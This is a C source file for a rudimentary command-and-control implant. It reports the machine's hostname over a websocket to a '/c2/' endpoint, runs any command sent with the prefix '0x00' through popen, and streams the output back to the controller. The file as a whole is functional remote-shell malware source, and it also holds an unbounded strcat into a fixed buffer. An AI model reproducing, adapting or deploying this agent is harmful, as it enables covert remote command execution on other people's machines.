#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

#include "mongoose/mongoose.h"

static int closed = 0;
char results[4096];

const char *
get_machine_name()
{
   static struct utsname u;
   if (uname(&u) < 0) {
      assert(0);
      return "unknown";
   }
   return u.nodename;
}

void
run_command(const char *command)
{
    printf("Running... %s\n", command);
    char buffer[1024];
    FILE *fp = popen(command, "r");
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(results, buffer);
    }
    pclose(fp);
}

bool
prefix(const char *pre, const char *str)
{
    return strncmp(pre, str, strlen(pre)) == 0;
}

int
tasking(int data_size, const char *data)
{
    //printf("%.*s\n", data_size, data);

    if (prefix("0x00", data) == true) {
        data += 5;
        run_command(data);
    } else if (prefix("0x01", data) == true) {
        printf("Do something else here...\n");
    }

    return 0;
}

static void
event_handler(struct mg_connection *conn, int event, void *event_data)
{
    (void) conn;

    switch (event) {
        case MG_EV_WEBSOCKET_HANDSHAKE_DONE: {
            struct http_message *hm = (struct http_message *) event_data;
            if (hm->resp_code == 101) {
                printf("[+] Connected\n");
            } else {
                printf("[-] Connection failed! HTTP code %d\n", hm->resp_code);
            }
            break;
        }
        case MG_EV_POLL: {
            int n = strlen(results);
            if (n != 0) {
                mg_send_websocket_frame(conn, WEBSOCKET_OP_TEXT, results, n);
            }
            //memset(results, 0, 4096);
            //results[0] = '\0';
            break;
        }
        case MG_EV_WEBSOCKET_FRAME: {
            struct websocket_message *wm = (struct websocket_message *) event_data;
            tasking(wm->size, (char *) wm->data);
            break;
        }
        case MG_EV_CLOSE: {
            closed = 1;
            printf("[-] Disconnected\n");
            break;
        }
    }
}

int
main()
{
    struct mg_mgr mgr;
    struct mg_connection *conn;

    char url[128];
    snprintf(url, 128, "ws://127.0.0.1:1337/c2/%s", get_machine_name());

    mg_mgr_init(&mgr, NULL);

    conn = mg_connect_ws(&mgr, event_handler, url, NULL, NULL);
    if (conn == NULL) {
        fprintf(stderr, "Invalid address\n");
        return 1;
    }

    while (!closed) {
        mg_mgr_poll(&mgr, 100);
    }
    mg_mgr_free(&mgr);

    return 0;
}
